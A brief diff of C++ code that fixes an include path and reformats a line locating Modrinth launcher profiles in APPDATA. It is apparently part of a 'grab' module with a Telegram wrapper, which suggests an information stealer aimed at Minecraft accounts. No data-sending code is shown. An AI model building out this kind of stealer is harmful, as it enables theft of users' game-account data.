@@ -1,4 +1,4 @@
-#include "pch.h"
+#include "../pch.h"
 #include "minecraft.h"
 #include "../wrappers/telegram.h"
 
@@ -49,8 +49,7 @@ namespace grab {
         if (!appDataEnv || !tempEnv)
             return;
 
-        fs::path instancesPath =
-            fs::path(appDataEnv) / "ModrinthApp" / "profiles";
+        fs::path instancesPath = fs::path(appDataEnv) / "ModrinthApp" / "profiles";
 
         if (!fs::exists(instancesPath)) return;
 
